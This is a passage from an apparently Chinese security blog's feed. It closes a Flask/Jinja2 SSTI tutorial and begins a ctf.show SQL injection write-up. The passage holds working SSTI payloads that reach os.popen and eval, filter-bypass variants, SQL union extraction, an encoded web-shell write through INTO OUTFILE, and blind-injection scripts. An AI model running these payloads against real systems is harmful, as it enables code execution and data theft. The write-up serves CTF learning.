D:pass</code></p><p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过__class__魔术方法来找到它的当前类</p><p><code>c=C()</code></p><p><code>print(c.__class__.__base__)</code></p><p>可以看到回显C类的父类B类，如果想找到A类那就再加一个<code>.__base__</code></p><p>再之后A类上面应该是没有类了但是其实在python里面所有的类都是object，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，因此我们在到A类里面再添加一个__base__就能拿到object，当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用__mro__魔术方法来一步到位看到类的所有父类(由于它是以数组形式的所以我们在后面加上下标就能拿到指定的类了)</p><p><code>print(c.__class__.__mro__[3])</code></p><p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过__subclasses__来获取当前类的所有子类，<code>print(c.__class__.__mro__[3].__subclasser__)</code></p><p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，当然我们最终的目的是要去进行rce，因此我们应该寻找与之相关的类，这里就给出一个类<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，我们在这里找一下，一般大概在第139个，不过具体的环境还是要具体分析，比如我这里就是156(有时候可以使用一些脚本试试)，跟前面的__mro__魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__)</span><br></pre></td></tr></table></figure><p>可以发现很多全局变量都在里面，我们需要最后能够进行rce，因此应该找到能执行系统命令的方法，这里用popen函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数，我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出</p><p><code>print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read())</code></p><p>可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__class__            返回该对象所属的类。py万物皆对象，比如某个字符串对象，而其所属的类为&lt;class &#x27;str&#x27;&gt;`</span><br><span class="line">`__base__             以字符串形式返回一个类的父类`</span><br><span class="line">`__bases__            以元组形式返回一个类的全部父类`</span><br><span class="line">`__mro__              返回解析方法调用的顺序，即返回所有父类`</span><br><span class="line">`__subclasses__()     返回这个类的所有子类`</span><br><span class="line">`__init__             初始化类，返回的类型是function`</span><br><span class="line">`__globals__          用于获取function所处空间下可使用的module、方法以及所有变量`</span><br><span class="line">`__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里`</span><br><span class="line">`__str__()            返回描写这个对象的字符串，可以理解成是打印出来。`</span><br><span class="line">`__getattribute__()   绕过关键字。实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。`</span><br><span class="line">`__getitem__()        绕过[]。调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)`</span><br><span class="line">`__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]`</span><br><span class="line"></span><br><span class="line">`__builtins__         内建名称空间，里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。`</span><br><span class="line">`url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。`</span><br><span class="line">`get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。`</span><br><span class="line">`lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()`</span><br><span class="line">`request.args.x1    get传参`</span><br><span class="line">`request.values.x1  所有参数`</span><br><span class="line">`request.cookies      cookies参数`</span><br><span class="line">`request.headers      请求头参数`</span><br><span class="line">`request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)`</span><br><span class="line">`request.data   post传参(Content-Type:a/b)`</span><br><span class="line">`request.json post传json  (Content-Type: application/json)`</span><br><span class="line"></span><br><span class="line">`config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;`</span><br><span class="line">`current_app          应用上下文，一个全局变量。`</span><br><span class="line">`g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;`  </span><br></pre></td></tr></table></figure><p>​    (真的多)</p><h4 id="常见的命令执行方式："><a href="#常见的命令执行方式：" class="headerlink" title="常见的命令执行方式："></a>常见的命令执行方式：</h4><h5 id="os-system"><a href="#os-system" class="headerlink" title="os.system():"></a>os.system():</h5><p><code>…init__globals[‘os’].system(‘ls’)</code>的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回0，失败返回-1，因为输出结果不明显，所以我们也会用到下面这个命令：</p><h5 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen():"></a>os.popen():</h5><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`os.popen(command[,mode[,bufsize]])`</span><br><span class="line">`eg:&#123;&#123;()class.base.subclass__()[71].init.globlas__[‘os’].popen(‘ls’,‘r’).read()&#125;&#125;`</span><br></pre></td></tr></table></figure><p>说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init.globals__[‘os’].popen(‘ls’,‘r’),read()</span><br></pre></td></tr></table></figure><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。</p><p>缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息</p><h5 id="warnings-catchwarning"><a href="#warnings-catchwarning" class="headerlink" title="warnings.catchwarning:"></a>warnings.catchwarning:</h5><p>访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p><p>例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;ls&#x27;)`</span><br></pre></td></tr></table></figure><h5 id="builtins-内建函数"><a href="#builtins-内建函数" class="headerlink" title="__builtins__内建函数:"></a>__builtins__内建函数:</h5><p>内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多们需要的eval函数，可以执行命令</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`这两个payload用的是同一个模块,__builtins__模块,eval方法.`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].popen(&#x27;ls&#x27;).read()`</span><br></pre></td></tr></table></figure><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过:"></a>绕过:</h4><h5 id="拼接："><a href="#拼接：" class="headerlink" title="拼接："></a>拼接：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;)).read()`</span><br></pre></td></tr></table></figure><h5 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)`</span><br></pre></td></tr></table></figure><p><code>等价于</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(可以看出单双引号内的都可以编码)`</span><br></pre></td></tr></table></figure><p><code>同理还可以进行rot13、16进制编码等</code></p><h5 id="过滤中括号-："><a href="#过滤中括号-：" class="headerlink" title="过滤中括号[]："></a>过滤中括号[]：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`getitem()`</span><br><span class="line"></span><br><span class="line">`&quot;&quot;.__class__.__mro__[2]`</span><br><span class="line">`&quot;&quot;.__class__.__mro__.__getitem__(2)`</span><br><span class="line"></span><br><span class="line">`pop()`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()`</span><br></pre></td></tr></table></figure><p><code>字典读取</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__builtins__[&#x27;eval&#x27;]()`</span><br><span class="line">`__builtins__.eval()`</span><br></pre></td></tr></table></figure><p><code>经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行</code></p><h5 id="过滤引号："><a href="#过滤引号：" class="headerlink" title="过滤引号："></a>过滤引号：</h5><p><code>先获取chr函数，赋值给chr，后面拼接字符串</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）`</span><br><span class="line"></span><br><span class="line">`&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd`</span><br><span class="line"></span><br><span class="line">`PS：将其中的request.args改为request.values则利用post的方式进行传参`</span><br><span class="line"></span><br><span class="line">`执行命令：`</span><br><span class="line"></span><br><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read()`</span><br><span class="line">`&#125;&#125;&amp;cmd=id`</span><br></pre></td></tr></table></figure><h5 id="过滤双下划线-："><a href="#过滤双下划线-：" class="headerlink" title="过滤双下划线__："></a>过滤双下划线__：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;&#123;`</span><br><span class="line">`&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()`</span><br><span class="line">`&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></table></figure><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show_sql注入上</title>
      <link href="/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/"/>
      <url>/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="show-sql注入上"><a href="#show-sql注入上" class="headerlink" title="show_sql注入上"></a>show_sql注入上</h2><h3 id="171："><a href="#171：" class="headerlink" title="171："></a>171：</h3><p>这个是考察万能密码的直接：’ or 1&#x3D;1–+就直接出来了</p><p>这里说一下sql的基本查看语句：一般来说正常的是：</p><p>SELECT * FROM users WHERE username &#x3D; ‘$input’ AND password &#x3D; ‘$password’;</p><p>然后你注入万能密码就成为了：</p><p>SELECT * FROM users WHERE username &#x3D; ‘’ or 1&#x3D;1–+ AND password &#x3D; ‘$password’;(–+表示注释，即注释之后的都不执行)</p><p>这样原本的查询条件就被破坏，<code>or 1=1</code> 使得整个 <code>WHERE</code> 条件恒为真，并且 <code>--</code> 注释掉了后面的 <code>AND password = &#39;$password&#39;</code> 部分，最终可能导致攻击者绕过认证机制，获取到数据库中 <code>users</code> 表的所有记录等恶意操作。当然mysql数据库也不一定是’’进行闭合的，具体问题具体分析。</p><h3 id="172"><a href="#172" class="headerlink" title="172:"></a>172:</h3><p>这个也是没有过滤，先试试万能密码：’ or 1&#x3D;1–+成功回显说明是’进行闭合，接下来就可以试试sql的语句了(有俩列数据)：</p><p>‘ union select 1,2–+</p><p>‘ union select 1,database()–+</p><p>‘ union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p>‘ union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;’ctfshow_user2’–+</p><p>‘ union select 1,group_concat(password)from ctfshow_user2–+</p><h3 id="173"><a href="#173" class="headerlink" title="173:"></a>173:</h3><p>一样，’ union select 1,2,group_concat(password)from ctfshow_user3–+</p><h3 id="174："><a href="#174：" class="headerlink" title="174："></a>174：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flag|[0-9]/i</span><br></pre></td></tr></table></figure><p>这个额可以使用replace</p><p>‘ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”) from ctfshow_user4 where username&#x3D;”flag” – +</p><p>然后得到：Y@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I</p><p>然后在pycharm里面进行替换解密：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag64 = &quot;Y@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I&quot;</span><br><span class="line"></span><br><span class="line">flag = flag64.replace(&quot;@A&quot;, &quot;1&quot;).replace(&quot;@B&quot;, &quot;2&quot;).replace(&quot;@C&quot;, &quot;3&quot;).replace(&quot;@D&quot;, &quot;4&quot;).replace(&quot;@E&quot;, &quot;5&quot;).replace(</span><br><span class="line">    &quot;@F&quot;, &quot;6&quot;).replace(&quot;@G&quot;, &quot;7&quot;).replace(&quot;@H&quot;, &quot;8&quot;).replace(&quot;@I&quot;, &quot;9&quot;).replace(&quot;@J&quot;, &quot;0&quot;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>就出来flag了</p><h3 id="175："><a href="#175：" class="headerlink" title="175："></a>175：</h3><p>这个可以进行写入文件：</p><p>union select 1,group_concat(password) from ctfshow_user5 where username&#x3D;”flag” into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt”</p><p>但是我不知道为什么复现不了；</p><p>或者：传入一句话木马(进行url编码之后再进行base64编码)</p><p>1’ union select 1,from_base64(“%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b”) into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php然后url&#x2F;1.php蚁剑连接就行</p><h3 id="176："><a href="#176：" class="headerlink" title="176："></a>176：</h3><p>‘ or 1&#x3D;1%23万能密码直接出来了；</p><h3 id="177："><a href="#177：" class="headerlink" title="177："></a>177：</h3><p>此处是对空格进行绕过</p><p>空格可以进行：&#x2F;**&#x2F;(注释)，%0a(换行符),%0b(垂直制表符差不多也是换行符),%0c.%09</p><h3 id="178"><a href="#178" class="headerlink" title="178:"></a>178:</h3><p>同上，空格换成%0b|%0c</p><h3 id="179"><a href="#179" class="headerlink" title="179:"></a>179:</h3><p>空格换成%0c</p><h3 id="180"><a href="#180" class="headerlink" title="180:"></a>180:</h3><p>‘or’1’&#x3D;’1’–%0c</p><h3 id="181："><a href="#181：" class="headerlink" title="181："></a>181：</h3><p>‘or’1’&#x3D;’1’–%0c</p><h3 id="182："><a href="#182：" class="headerlink" title="182："></a>182：</h3><p>‘or’1&#x3D;1’–%01</p><p>‘or’1&#x3D;1’–%08</p><p>0c也可以</p><h3 id="183："><a href="#183：" class="headerlink" title="183："></a>183：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在csdn上面学到了一些东西：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`like(&#x27;&#123;&#125;%&#x27;)&quot;</span>.<span class="built_in">format</span>(flag + k)&#125;</span><br></pre></td></tr></table></figure><ul><li>这行代码构造了一个字典 <code>data</code>，用于作为 POST 请求的数据。</li><li><code>tableName</code> 是请求参数名，其值是一个 SQL 语句片段。<code>like(&#39;&#123;&#125;%&#39;)</code> 是 SQL 的模糊匹配操作符，意思是匹配以 <code>flag + k</code> 开头的字符串。注释掉的部分使用了 <code>regexp</code> 正则表达式匹配，功能类似。</li></ul><p>然后空格的话可以使用()绕过或者&#96;&#96;反引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://cd86bba0-571c-482d-a491-5e7e79faadd1.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flag可能的字符</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;ctfshow&#123;&#x27;  # 已经确定的部分</span><br><span class="line">for j in range(0, 50):  # 为了确保flag完整输出，范围尽量大一点，观察到flag完全输出后结束运行即可</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;(ctfshow_user)where(pass)like&#x27;&#123;out+k&#125;%&#x27;&quot;&#125;  # 将每次更新后的out加上我们新增的一个猜测字符添加到payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # 回显1说明我们猜正确了，跳出内层循环，继续猜下一位</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h3 id="184："><a href="#184：" class="headerlink" title="184："></a>184：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>新过滤了where了，可以使用having</p><p>区别：<code>WHERE</code>是对原始数据行的过滤，<code>HAVING</code>是对分组聚合后的结果进行筛选。在没有<code>GROUP BY</code>子句时，<code>HAVING</code>的行为与<code>WHERE</code>类似，但<code>HAVING</code>支持聚合函数</p><p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前</p><p>然后单双引号、反引号都被过滤了，但是本题没有过滤空格,单双引号可以用括号+十六进制。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://6244362c-ee43-4012-81d5-275793a9617c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flag可能的字符</span><br><span class="line">dic = [f&quot;&#123;ord(c):02x&#125;&quot; for c in dic]</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;0x63746673686f777b&#x27;  # 已经确定的部分</span><br><span class="line">for j in range(0, 50):  # 为了确保flag完整输出，范围尽量大一点，观察到flag完全输出后结束运行即可</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;ctfshow_user group by pass having pass like &#123;out+k&#125;25&quot;&#125;  # 将每次更新后的out加上我们新增的一个猜测字符添加到payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # 回显1说明我们猜正确了，跳出内层循环，继续猜下一位</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h3 id="185："><a href="#185：" class="headerlink" title="185："></a>185：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个过滤了数字不过，可以使用sql语法：可以使用 true 结合 concat 拼接出数字   例：</p><p>mysql&gt; select concat(true,true);<br>+——————-+<br>| concat(true,true) |<br>+——————-+<br>| 11                |<br>+——————-+<br>1 row in set (0.00 sec)</p><p>附上yu师傅的脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">s=&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    #print(data)</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">      flag+=j</span><br><span class="line">      print(flag)</span><br><span class="line">      if j==&#x27;&#125;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">      break</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br></pre></td></tr></table></figure><p>这个先将s给转化为ascll码，然后进行true的加和乘，用来回显出来字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个先找出来以ctfshow{开头的字段，然后猜flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">  flag+=j</span><br><span class="line">  print(flag)</span><br><span class="line">  if j==&#x27;&#125;&#x27;:</span><br><span class="line">    exit(0)</span><br><span class="line">  break</span><br></pre></td></tr></table></figure><p>这个用来判断flag。</p><h3 id="186："><a href="#186：" class="headerlink" title="186："></a>186：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>还是yu师傅的脚本</p><h3 id="187："><a href="#187：" class="headerlink" title="187："></a>187：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(*) from ctfshow_user where username = &#x27;$username&#x27; and password= &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = md5($_POST[&#x27;password&#x27;],true);</span><br><span class="line"></span><br><span class="line">//只有admin可以获得flag</span><br><span class="line">if($username!=&#x27;admin&#x27;)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;用户名不存在&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是登录页面，</p><p>string md5( string $str[, bool $raw_output &#x3D; false] )</p><ul><li>raw_output：如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</li></ul><p><code>ffifdyop</code>是一个特殊的字符串，类似万能密码。还有129581926211651571912466741651878684928也可以达到同样的效果。</p><p>然后admin ffifdyop 就登录进去了，记得bp抓包</p><h3 id="188："><a href="#188：" class="headerlink" title="188："></a>188：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line"> 